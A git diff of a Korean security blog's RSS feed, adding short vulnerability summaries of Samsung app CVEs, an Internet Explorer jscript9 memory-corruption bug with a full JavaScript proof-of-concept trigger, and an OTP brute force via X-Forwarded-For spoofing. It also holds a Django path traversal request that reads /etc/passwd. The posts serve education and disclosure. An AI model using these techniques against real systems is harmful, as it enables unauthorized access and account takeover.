@@ -9,8 +9,104 @@
     <atom:link href="https://hackyboiz.github.io/rss2.xml" rel="self" type="application/rss+xml"/>
     
     <description>hack &amp; life</description>
-    <pubDate>Sun, 13 Jun 2021 02:40:13 GMT</pubDate>
+    <pubDate>Wed, 16 Jun 2021 04:50:57 GMT</pubDate>
     <generator>http://hexo.io/</generator>
+    
+    <item>
+      <title>[하루한줄] Samsung mobile 기본 앱 취약점</title>
+      <link>https://hackyboiz.github.io/2021/06/16/fabu1ous/2021-06-16/</link>
+      <guid>https://hackyboiz.github.io/2021/06/16/fabu1ous/2021-06-16/</guid>
+      <pubDate>Wed, 16 Jun 2021 05:00:00 GMT</pubDate>
+      
+        
+        
+      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://blog.oversecured.com/Two-weeks-of-securing-Samsun</description>
+        
+      
+      
+      
+      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://blog.oversecured.com/Two-weeks-of-securing-Samsung-devices-Part-1/">Two weeks of securing Samsung devices: Part 1</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a><strong>Target</strong></h2><p>Samsung mobile 기본 앱</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a><strong>Explain</strong></h2><p>Oversecured 팀이 삼성 모바일 기기에 기본 제공되는 앱에서 다수의 취약점을 발견했습니다. 해커는 해당 취약점들을 악용해 타겟 기기의 연락처, 통화, SMS/MMS에 접근하여 편집하고 관리자 권한으로 임의의 앱을 설치할 수 있습니다.</p><ul><li><p>CVE-2021-25388</p><p>Knox Core는 URI 파라미터 검증이 미흡해 해커가 임의의 앱을 설치하거나 임의의 파일을 탈취할 수 있습니다. </p></li><li><p>CVE-2021-25356</p><p>Managed Provisioning은 모든 상호작용의 승인을 확인하기 위한 보안 검사가 있습니다. 하지만 <code>com.samsung.knox.container.requestId</code>값이 설정되어있다면 이를 무시할 수 있어 해커는 임의의 앱을 설치하고 관리자 권한을 부여할 수 있습니다.</p></li><li><p>CVE-2021-25391</p><p>Secure Folder는 Intent redirection 취약점이 있어 해커가 읽기, 쓰기 작업을 가로챌 수 있습니다.</p></li><li><p>CVE-2021-25393</p><p>SecSetting은 intent에 대한 부적절한 sanitization 때문에 해커가 system uid 데이터에 접근 할 수 있습니다.</p></li><li><p>CVE-2021-25392</p><p>Samsung Dex는 부적절한 백업 경로 설정 때문에 해커가 이를 변경해 크리티컬 데이터를 노출시킬 수 있습니다.</p></li><li><p>CVE-2021-25397</p><p>TelephonyUI의 부적절한 Access control 때문에 해커는 TelephonyUI의 파일에 대한 쓰기 작업을 할 수 있습니다.</p></li><li><p>CVE-2021-25390</p><p>PhotoTable의 Intent redirection 취약점은 해커가 임의의 파일에 접근할 수 있게 합니다.</p></li></ul>]]></content:encoded>
+      
+      
+      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
+      
+      
+      <category domain="https://hackyboiz.github.io/tags/Fabu1ous/">Fabu1ous</category>
+      
+      <category domain="https://hackyboiz.github.io/tags/samsung/">samsung</category>
+      
+      <category domain="https://hackyboiz.github.io/tags/pre-installed-app/">pre-installed app</category>
+      
+      
+      <comments>https://hackyboiz.github.io/2021/06/16/fabu1ous/2021-06-16/#disqus_thread</comments>
+      
+    </item>
+    
+    <item>
+      <title>[하루한줄] CVE-2021-31959: Internet Explorer Uninitialized Property ID array</title>
+      <link>https://hackyboiz.github.io/2021/06/15/l0ch/2021-06-15/</link>
+      <guid>https://hackyboiz.github.io/2021/06/15/l0ch/2021-06-15/</guid>
+      <pubDate>Tue, 15 Jun 2021 05:00:00 GMT</pubDate>
+      
+        
+        
+      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://securitylab.github.com/advisories/GHSL-2021-075-d</description>
+        
+      
+      
+      
+      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://securitylab.github.com/advisories/GHSL-2021-075-django/">Issue 2168: Internet Explorer: Memory corruption in jscript9.dll due to uninitialized Property ID array</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Internet Explorer (Windows 10)</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>MS에서 지원을 2022년 6월에 완전히 종료하겠다고 밝힌 Internet Explorer에서 초기화되지 않은 배열 요소의 사용으로 인한 취약점이 발견되어 세부 정보가 공개되었습니다.</p><p>취약점은 jscript9의 PropertyID 배열의 처리 방식에 존재합니다. PropertyID 배열은 <code>ByteCodeGenerator::EmitScopeObjectInit</code> 함수에 할당됩니다. 이때 할당 시 메모리를 초기화하지 않는 <code>ArenaAllocator::Alloc</code> 함수를 사용해 배열을 할당하므로 배열의 일부가 초기화되지 않은 상태로 유지됩니다.</p><p>이러한 초기화되지 않은 PropertyID로 변수의 scope를 속일 수 있습니다. 이를 악용하면 정상적인 방법으로 액세스 할 수 없는 변수에 액세스 할 수 있으며 원격 코드 실행으로 이어질 수 있습니다. 해당 취약점은 <a href="https://googleprojectzero.github.io/0days-in-the-wild/0day-RCAs/2020/CVE-2020-1380.html">CVE-2020-1380</a>과 동일한 방법으로 JIT 엔진을 사용해 트리거할 수 있습니다.</p><p><strong>PoC Code</strong></p><pre><code class="hljs html"><span class="hljs-comment">&lt;!-- saved from url=(0014)about:internet --&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">alert(<span class="hljs-string">&#x27;start&#x27;</span>);</span><span class="javascript"><span class="hljs-comment">// prepare objects</span></span><span class="javascript"><span class="hljs-keyword">var</span> buf = <span class="hljs-keyword">new</span> <span class="hljs-built_in">ArrayBuffer</span>(<span class="hljs-number">0x8c</span>);</span><span class="javascript"><span class="hljs-keyword">var</span> arr = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Int32Array</span>(buf);</span><span class="javascript"><span class="hljs-keyword">var</span> o = &#123;&#125;;</span><span class="javascript">o.valueOf = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) </span>&#123;</span><span class="javascript">    alert(<span class="hljs-string">&#x27;callback&#x27;</span>);</span><span class="javascript">    <span class="hljs-comment">// free </span></span><span class="javascript">    worker = <span class="hljs-keyword">new</span> Worker(<span class="hljs-string">&#x27;worker.js&#x27;</span>);</span>    worker.postMessage(buf, [buf]);    worker.terminate();<span class="javascript">    worker = <span class="hljs-literal">null</span>;</span><span class="javascript">    <span class="hljs-comment">// sleep</span></span><span class="javascript">    <span class="hljs-keyword">var</span> start = <span class="hljs-built_in">Date</span>.now();</span><span class="javascript">    <span class="hljs-keyword">while</span> (<span class="hljs-built_in">Date</span>.now() - start &lt; <span class="hljs-number">200</span>) &#123;&#125;</span><span class="javascript">    <span class="hljs-comment">// <span class="hljs-doctag">TODO:</span> reclaim freed memory</span></span><span class="javascript">    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span></span>&#125;;<span class="javascript"><span class="hljs-comment">// generate function from string in order to have a clean bytecode generator</span></span><span class="javascript"><span class="hljs-keyword">var</span> vulnstr =</span><span class="javascript"><span class="hljs-string">&quot;for (let i=0; i&lt;1; i++) &#123;\n&quot;</span> +</span><span class="javascript"><span class="hljs-string">&quot;    function opt(A, x, crash) &#123;\n&quot;</span> +</span><span class="javascript"><span class="hljs-string">&quot;        &#x27;use strict&#x27;;\n&quot;</span> +</span><span class="javascript"><span class="hljs-string">&quot;        const aagaaaaaaahabauaaaaa = x+1;\n&quot;</span> + <span class="hljs-comment">//special variable name so that hash is eqal to 0x109 (property ID of Int16Array)</span></span><span class="javascript"><span class="hljs-string">&quot;        const c02 = aagaaaaaaahabauaaaaa+1;\n&quot;</span> +</span><span class="javascript"><span class="hljs-string">&quot;        const c03 = c02+1;\n&quot;</span> +</span><span class="javascript"><span class="hljs-string">&quot;        const c04 = c03+1;\n&quot;</span> +</span><span class="javascript"><span class="hljs-string">&quot;        const c05 = c04+1;\n&quot;</span> +</span><span class="javascript"><span class="hljs-string">&quot;        let c06 = c05+1;\n&quot;</span> +  <span class="hljs-comment">// this variable will alias with Int16Array</span></span><span class="javascript"><span class="hljs-string">&quot;        const c07 = c06+1;\n&quot;</span> +</span><span class="javascript"><span class="hljs-string">&quot;        const c08 = c07+1;\n&quot;</span> +</span><span class="javascript"><span class="hljs-string">&quot;        const c09 = c08+1;\n&quot;</span> +</span><span class="javascript"><span class="hljs-string">&quot;        const c10 = c09+1;\n&quot;</span> +</span><span class="javascript"><span class="hljs-string">&quot;        const c11 = c10+1;\n&quot;</span> +</span><span class="javascript"><span class="hljs-string">&quot;        const c12 = c11+1;\n&quot;</span> +</span><span class="javascript"><span class="hljs-string">&quot;        const c13 = c12+1;\n&quot;</span> +</span><span class="javascript"><span class="hljs-string">&quot;        const c14 = c13+1;\n&quot;</span> +</span><span class="javascript"><span class="hljs-string">&quot;        const c15 = c14+1;\n&quot;</span> +</span><span class="javascript"><span class="hljs-string">&quot;        const c16 = c15+1;\n&quot;</span> +</span><span class="javascript"><span class="hljs-string">&quot;        const c17 = c16+1;\n&quot;</span> +</span><span class="javascript"><span class="hljs-string">&quot;        const c18 = c17+1;\n&quot;</span> +</span><span class="javascript"><span class="hljs-string">&quot;        const c19 = c18+1;\n&quot;</span> +</span><span class="javascript"><span class="hljs-string">&quot;        const c20 = c19+1;\n&quot;</span> +</span><span class="javascript"><span class="hljs-string">&quot;        const c21 = c20+1;\n&quot;</span> +</span><span class="javascript"><span class="hljs-string">&quot;        const c22 = c21+1;\n&quot;</span> +</span><span class="javascript"><span class="hljs-string">&quot;        const c23 = c22+1;\n&quot;</span> +</span><span class="javascript"><span class="hljs-string">&quot;        const c24 = c23+1;\n&quot;</span> +</span><span class="javascript"><span class="hljs-string">&quot;        const c25 = c24+1;\n&quot;</span> +</span><span class="javascript"><span class="hljs-string">&quot;        const c26 = c25+1;\n&quot;</span> +</span><span class="javascript"><span class="hljs-string">&quot;        const c27 = c26+1;\n&quot;</span> +</span><span class="javascript"><span class="hljs-string">&quot;        const c28 = c27+1;\n&quot;</span> +</span><span class="javascript"><span class="hljs-string">&quot;        const c29 = c28+1;\n&quot;</span> +</span><span class="javascript"><span class="hljs-string">&quot;        const c30 = c29+1;\n&quot;</span> +</span><span class="javascript"><span class="hljs-string">&quot;        const c31 = c30+1;\n&quot;</span> +</span><span class="javascript"><span class="hljs-string">&quot;        const c32 = c31+1;\n&quot;</span> +</span><span class="javascript"><span class="hljs-string">&quot;        const c33 = c32+1;\n&quot;</span> +</span><span class="javascript"><span class="hljs-string">&quot;        const c34 = c33+1;\n&quot;</span> +</span><span class="javascript"><span class="hljs-string">&quot;        const c35 = c34+1;\n&quot;</span> +</span><span class="javascript"><span class="hljs-string">&quot;        const c36 = c35+1;\n&quot;</span> +</span><span class="javascript"><span class="hljs-string">&quot;        const c37 = c36+1;\n&quot;</span> +</span><span class="javascript"><span class="hljs-string">&quot;        const c38 = c37+1;\n&quot;</span> +</span><span class="javascript"><span class="hljs-string">&quot;        if(crash) &#123;\n&quot;</span> +</span><span class="javascript"><span class="hljs-string">&quot;          c06 = c06 + 1;\n&quot;</span> + <span class="hljs-comment">// we must change it here so that the value below is not known</span></span><span class="javascript"><span class="hljs-string">&quot;          Int16Array = o;\n&quot;</span> + <span class="hljs-comment">// here we actually change the value (and type) of c06</span></span><span class="javascript"><span class="hljs-string">&quot;        &#125;\n&quot;</span> +</span><span class="javascript"><span class="hljs-string">&quot;        A[0] = c06;\n&quot;</span> + <span class="hljs-comment">// if crash==1, c06 is an object here, but JIT thinks it&#x27;s an integer</span></span><span class="javascript"><span class="hljs-string">&quot;        eval(1);\n&quot;</span> +  <span class="hljs-comment">// needed to trigger ByteCodeGenerator::EmitScopeObjectInit</span></span><span class="javascript"><span class="hljs-string">&quot;    &#125;\n&quot;</span> +</span><span class="javascript"><span class="hljs-string">&quot;    for(var i=0; i&lt;100000; i++) &#123;\n&quot;</span> + <span class="hljs-comment">// jit a function</span></span><span class="javascript"><span class="hljs-string">&quot;      opt(arr, 1, 0);\n&quot;</span> +</span><span class="javascript"><span class="hljs-string">&quot;    &#125;\n&quot;</span> +</span><span class="javascript"><span class="hljs-string">&quot;    opt(arr, 1, 1);\n&quot;</span> +</span><span class="javascript"><span class="hljs-string">&quot;    alert(&#x27;failed&#x27;);\n&quot;</span> +</span><span class="javascript"><span class="hljs-string">&quot;&#125;&quot;</span>;</span><span class="javascript">vuln = <span class="hljs-built_in">Function</span>(vulnstr);</span>vuln();<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></code></pre>]]></content:encoded>
+      
+      
+      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
+      
+      
+      <category domain="https://hackyboiz.github.io/tags/cve/">cve</category>
+      
+      <category domain="https://hackyboiz.github.io/tags/microsoft/">microsoft</category>
+      
+      <category domain="https://hackyboiz.github.io/tags/internet-explorer/">internet explorer</category>
+      
+      <category domain="https://hackyboiz.github.io/tags/L0ch/">L0ch</category>
+      
+      <category domain="https://hackyboiz.github.io/tags/uninitialized-variable/">uninitialized variable</category>
+      
+      
+      <comments>https://hackyboiz.github.io/2021/06/15/l0ch/2021-06-15/#disqus_thread</comments>
+      
+    </item>
+    
+    <item>
+      <title>[하루한줄] Rate Limit 우회를 통한 OTP Brute-Force</title>
+      <link>https://hackyboiz.github.io/2021/06/14/idioth/2021-06-14/</link>
+      <guid>https://hackyboiz.github.io/2021/06/14/idioth/2021-06-14/</guid>
+      <pubDate>Mon, 14 Jun 2021 05:00:00 GMT</pubDate>
+      
+        
+        
+      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://systemweakness.com/brute-forcing-otp-via-bypassin</description>
+        
+      
+      
+      
+      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://systemweakness.com/brute-forcing-otp-via-bypassing-rate-limit-c5ee6b25c2a8">OTP Brute-Force Via Rate Limit Bypass</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>One Time Password</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Rate limit가 존재하는 OTP (One Time Password) 메커니즘을 우회하여 Brute Force이 가능한 방법이 공개되었습니다. 원글의 작성자는 버그 바운티의 타깃이 되는 웹 사이트를 공개하지 않았습니다.</p><p>타깃 웹사이트에서 비밀번호를 재설정하는 부분에 제공된 이메일 주소로 OTP가 전송됩니다. Reset Password 버튼을 반복하여 클릭하고 Burp Suite로 확인하면 rate limit가 적용되어 있습니다. 따라서 연속적인 request가 발생할 시 <code>Server error</code>가 발생합니다. 하지만 <code>X-Forwarded-For: 127.0.0.1</code> 헤더를 사용하여 OTP의 time limiting을 우회할 수 있습니다. 이를 통해 <code>X-Forwarded-For</code>의 호스트 ID를 <code>127.0.0.1</code>부터 <code>127.0.0.255</code>까지 바꿔가면서 OTP를 Brute Force 할 수 있습니다.</p><p><img src="https://miro.medium.com/max/1200/1*yuL2sY-lT9Z1TESnqGR1_w.png" alt="img"></p>]]></content:encoded>
+      
+      
+      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
+      
+      
+      <category domain="https://hackyboiz.github.io/tags/idioth/">idioth</category>
+      
+      <category domain="https://hackyboiz.github.io/tags/otp/">otp</category>
+      
+      <category domain="https://hackyboiz.github.io/tags/bruteforce/">bruteforce</category>
+      
+      <category domain="https://hackyboiz.github.io/tags/time-limiting/">time limiting</category>
+      
+      
+      <comments>https://hackyboiz.github.io/2021/06/14/idioth/2021-06-14/#disqus_thread</comments>
+      
+    </item>
     
     <item>
       <title>[Research] WinAFL로 마구 퍼징하기 Part2</title>
@@ -130,7 +226,7 @@
       
       
       
-      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://securitylab.github.com/advisories/GHSL-2021-075-django/">GHSL-2021-075: Path injection in Django - CVE-2021-33203</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>tested version: Django 3.2.2</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>파이썬으로 작성된 오픈소스 웹 프레임워크 Django에서는  <code>django.contrib.admindocs</code> 모듈이 활성화되었을 때 path traversal 취약점이 발생합니다.</p><pre><code class="hljs python"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TemplateDetailView</span>(<span class="hljs-params">BaseAdminDocsView</span>):</span>...<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_context_data</span>(<span class="hljs-params">self, **kargs</span>):</span>...template_file = Path(directory) / template<span class="hljs-keyword">if</span> template_file.exists():template_contents = template_file.read_text()...</code></pre><p><code>get_context_data()</code> 함수에서 해커는 template 변수를 임의의 값으로 설정할 수 있고 이를 별다른 검증 없이 Path join합니다. 이를 이용해 template directory 외부 경로의 파일을 제공할 수 있어 <code>http://localhost:8000/admin/doc/templates//etc/passwd/</code> 와 같이 요청을 보내는 것으로 파일 시스템 내 임의 경로의 파일 내용이 렌더링 메서드로 전달되어 파일 내용이 유출될 수 있습니다. 해당 취약점은 아래와 같이 <code>safe_join</code> 함수를 사용해 경로를 합치는 것으로 패치되었습니다.</p><pre><code class="hljs python">template_file = Path(safe_join(directory, template))</code></pre><p>자세한 패치 히스토리는 <a href="https://github.com/django/django/commit/46572de2e92fdeaf047f80c44d52269e54ad68db">https://github.com/django/django/commit/46572de2e92fdeaf047f80c44d52269e54ad68db</a> 에서 확인할 수 있습니다.</p>]]></content:encoded>
+      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://securitylab.github.com/advisories/GHSL-2021-075-django/">GHSL-2021-075: Path injection in Django - CVE-2021-33203</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>tested version: Django 3.2.2</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>파이썬에서 작성된 오픈소스 웹 프레임워크 Django에서 path traversal 취약점이 발견되었습니다. 해당 취약점은 <code>django.contrib.admindocs</code> 모듈이 활성화되었을 때 발생합니다.</p><pre><code class="hljs python"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TemplateDetailView</span>(<span class="hljs-params">BaseAdminDocsView</span>):</span>...<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_context_data</span>(<span class="hljs-params">self, **kargs</span>):</span>...template_file = Path(directory) / template<span class="hljs-keyword">if</span> template_file.exists():template_contents = template_file.read_text()...</code></pre><p><code>get_context_data()</code> 함수에서 해커는 template 변수를 임의의 값으로 설정할 수 있고 이를 별다른 검증 없이 Path join 합니다. 이를 이용해 template directory 외부 경로의 파일을 제공할 수 있어 <code>http://localhost:8000/admin/doc/templates//etc/passwd/</code>와 같은 요청을 보내는 것으로 파일 시스템 내 임의 경로의 파일 내용이 렌더링 메서드로 전달되어 파일 내용이 유출될 수 있습니다. 해당 취약점은 아래와 같이 <code>safe_join</code> 함수를 사용해 경로를 합치는 것으로 패치되었습니다.</p><pre><code class="hljs python">template_file = Path(safe_join(directory, template))</code></pre><p>자세한 패치 히스토리는 <a href="https://github.com/django/django/commit/46572de2e92fdeaf047f80c44d52269e54ad68db">https://github.com/django/django/commit/46572de2e92fdeaf047f80c44d52269e54ad68db</a> 에서 확인할 수 있습니다.</p>]]></content:encoded>
       
       
       <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
@@ -611,114 +707,6 @@
       
       
       <comments>https://hackyboiz.github.io/2021/05/30/l0ch/windows-driver/#disqus_thread</comments>
-      
-    </item>
-    
-    <item>
-      <title>[하루한줄] CVE-2021-29628 : PlayStation5 SMAP Bypass</title>
-      <link>https://hackyboiz.github.io/2021/05/30/j0ker/2021-05-30/</link>
-      <guid>https://hackyboiz.github.io/2021/05/30/j0ker/2021-05-30/</guid>
-      <pubDate>Sun, 30 May 2021 05:00:00 GMT</pubDate>
-      
-        
-        
-      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://hackerone.com/reports/1048322&quot;&gt;SMAP bypass(PS5)&lt;/</description>
-        
-      
-      
-      
-      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://hackerone.com/reports/1048322">SMAP bypass(PS5)</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a><strong>Target</strong></h2><p>PlayStation5, FreeBSD 12</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a><strong>Explain</strong></h2><p>SMAP(Supervisor-Mode Access Prevention)은 커널에서 유저랜드 메모리에 접근하지 못하게 하여 취약점 익스플로잇을 어렵게 하는 커널 레벨 보호기법입니다.</p><p>PlayStation 5(이하 PS5)는 FreeBSD 12 기반으로 개발된 운영체제인 Orbis 2.0을 사용합니다. CVE-2021-29628은 FreeBSD 12에서 발견됐었던 취약점이지만, PS5에서 이 취약점에 대해 패치를 하지 않아 PS5에서 SMAP를 bypass할 수 있었습니다.</p><p>PS5에서 SMAP가 활성화되어 있는 상태(<code>Rflags</code>의 <code>Alignment Check Flag</code>, <code>%RFLAGS.AC</code>가 세팅되지 않은 상태)에서 커널에서 유저 페이지에 접근하면 page fault가 발생합니다. 반면에 <code>%RFLAGS.AC</code>가 세팅되지 않은 상태에서는 커널에서 정상적으로 유저 페이지에 접근이 가능합니다. 하지만 FreeBSD 커널에서는 <code>copyin()</code>과 <code>copyout()</code> 함수들을 통해 <code>%RFLAGS.AC</code>를 잠시 세팅해서 유저 페이지에 접근합니다.</p><pre><code class="hljs wasm">.macroCOPYIN smap erms&#x2F;* ... *&#x2F;movq$copy_fault,PCB_ONFAULT(%r11)&#x2F;* ... *&#x2F;stac &#x2F;&#x2F; set %RFLAGS.AC, to allow access to user pagesdo_the_copyinclac &#x2F;&#x2F; clear %RFLAGS.AC, to forbid access to user pages&#x2F;* ... *&#x2F;copy_fault:movq$0,PCB_ONFAULT(%r11)movl$EFAULT,%eaxPOP_FRAME_POINTERret</code></pre><p><code>copyin()</code> 함수가 실행되면 fault handler인 <code>copy_fault()</code> 함수를 handler로 등록한 후 <code>%RFLAGS.AC</code>를 세팅해 복사 작업을 진행합니다. 그리고 복사 작업이 끝나면 다시 <code>%RFLAGS.AC</code>를 클리어합니다. 이 때, 복사 과정에서 fault가 발생하면 <code>trap()</code>함수가 실행됩니다.</p><pre><code class="hljs c"><span class="hljs-keyword">void</span>trap(struct trapframe *frame)&#123;<span class="hljs-comment">/* ... */</span><span class="hljs-keyword">if</span> (curpcb-&gt;pcb_onfault != <span class="hljs-literal">NULL</span>) &#123;frame-&gt;tf_rip = (<span class="hljs-keyword">long</span>)curpcb-&gt;pcb_onfault;<span class="hljs-keyword">return</span>;&#125;<span class="hljs-comment">/* ... */</span>&#125;</code></pre><p><code>trap()</code> 함수에서는 <code>curpcb-&gt;pcb_onfault</code>에 값이 들어가 있으면 이 안에 값을 <code>fram→tf_rip</code>에 넣고 바로 return 하는데, 이 때 <code>%RFLAGS.AC</code>를 클리어하지 않아 SMAP이 비활성화인 상태로 핸들링을 마무리합니다. 따라서 이를 통해 SMAP를 bypass하여 이 이후의 syscall들을 SMAP이 비활성화된 상태에서 실행할 수 있습니다.</p>]]></content:encoded>
-      
-      
-      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
-      
-      
-      <category domain="https://hackyboiz.github.io/tags/cve/">cve</category>
-      
-      <category domain="https://hackyboiz.github.io/tags/j0ker/">j0ker</category>
-      
-      <category domain="https://hackyboiz.github.io/tags/bypass/">bypass</category>
-      
-      <category domain="https://hackyboiz.github.io/tags/smap/">smap</category>
-      
-      <category domain="https://hackyboiz.github.io/tags/freebsd/">freebsd</category>
-      
-      <category domain="https://hackyboiz.github.io/tags/playstation5/">playstation5</category>
-      
-      
-      <comments>https://hackyboiz.github.io/2021/05/30/j0ker/2021-05-30/#disqus_thread</comments>
-      
-    </item>
-    
-    <item>
-      <title>[하루한줄] CVE-2021-31440: Linux Kernel eBPF verifier, incorrect bound check</title>
-      <link>https://hackyboiz.github.io/2021/05/29/fabu1ous/2021-05-29/</link>
-      <guid>https://hackyboiz.github.io/2021/05/29/fabu1ous/2021-05-29/</guid>
-      <pubDate>Sat, 29 May 2021 05:00:00 GMT</pubDate>
-      
-        
-        
-      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://www.zerodayinitiative.com/blog/2021/5/26/cve-2021</description>
-        
-      
-      
-      
-      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://www.zerodayinitiative.com/blog/2021/5/26/cve-2021-31440-an-incorrect-bounds-calculation-in-the-linux-kernel-ebpf-verifier">CVE-2021-31440: AN INCORRECT BOUNDS CALCULATION IN THE LINUX KERNEL EBPF VERIFIER</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a><strong>Target</strong></h2><p>Linux kernel 5.7 ~ Linux kernel 5.11.15</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a><strong>Explain</strong></h2><p>eBPF는 런타임 중 안전하게 커널 코드를 삽입하기 위해 Verifier와 BPF instruction을 사용합니다. Verifier는 레지스터의 값의 변화와 그 값들의 허용 범위(이하 range)등을 추적해 memory load와 store의 out-of-bound 여부를 검사합니다. CVE-2021-31440을 악용하면 out-of-bound 검사를 무력화하고 로컬 권한 상승을 노릴 수 있습니다.</p><pre><code class="hljs c">...    <span class="hljs-keyword">if</span> (__reg64_bound_u32(reg-&gt;umin_value))             reg-&gt;u32_min_value = (u32)reg-&gt;umin_value;     <span class="hljs-keyword">if</span> (__reg64_bound_u32(reg-&gt;umax_value))             reg-&gt;u32_max_value = (u32)reg-&gt;umax_value;...</code></pre><p>위는 취약한 코드 부분의 일부입니다. 기존 eBPF 취약점들과 마찬가지로 CVE-2021-31440 또한 64 bit range의 하위 32 비트로부터 32 bit range를 도출하는 과정에서 버그가 발생합니다. <code>umin_value</code>가 1, <code>umax_value</code> 가 1&lt;&lt;32이라 할 때 <code>u32_min_value</code>는 1, <code>u32_max_value</code>는 0으로 설정되고 실제 runtime range와 다른 값을 Verifier에게 전달하게 됩니다.</p><p>Verifier는 잘못된 레지스터 허용범위를 갖게 되고 이를 통해 해커는 out-of-bound read/write access가 가능해 로컬 권한 상승을 할 수 있습니다.</p>]]></content:encoded>
-      
-      
-      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
-      
-      
-      <category domain="https://hackyboiz.github.io/tags/Fabu1ous/">Fabu1ous</category>
-      
-      <category domain="https://hackyboiz.github.io/tags/linux/">linux</category>
-      
-      <category domain="https://hackyboiz.github.io/tags/kernel/">kernel</category>
-      
-      <category domain="https://hackyboiz.github.io/tags/lpe/">lpe</category>
-      
-      <category domain="https://hackyboiz.github.io/tags/oob/">oob</category>
-      
-      
-      <comments>https://hackyboiz.github.io/2021/05/29/fabu1ous/2021-05-29/#disqus_thread</comments>
-      
-    </item>
-    
-    <item>
-      <title>[하루한줄] CVE-2021-31727/31728: MalwareFox AntiMalware 로컬 권한상승 취약점</title>
-      <link>https://hackyboiz.github.io/2021/05/28/l0ch/2021-05-28/</link>
-      <guid>https://hackyboiz.github.io/2021/05/28/l0ch/2021-05-28/</guid>
-      <pubDate>Fri, 28 May 2021 05:00:00 GMT</pubDate>
-      
-        
-        
-      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://github.com/irql0/CVE-2021-31728&quot;&gt;CVE-2021-31728&lt;/</description>
-        
-      
-      
-      
